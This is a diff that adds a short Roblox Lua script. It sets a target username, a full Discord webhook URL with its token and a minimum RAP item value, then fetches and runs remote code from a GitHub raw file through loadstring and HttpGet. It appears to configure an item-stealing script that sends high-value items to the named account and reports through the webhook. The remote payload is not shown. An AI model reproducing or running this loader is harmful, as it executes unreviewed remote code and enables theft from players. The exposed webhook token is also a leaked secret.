@@ -1,0 +1,6 @@
+Username= 'remix_melody1'
+Webhook= 'https://discord.com/api/webhooks/1310515152902426645/nxg5FX_XOsTar5Tit_t6aTh354DW1QO8KEl_WN8ngSNd8XKaQcOvjXziQ15Hr2b3YkDd'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ssjjjjajaj/Eclipse-Hub/refs/heads/main/ggs.txt'))()
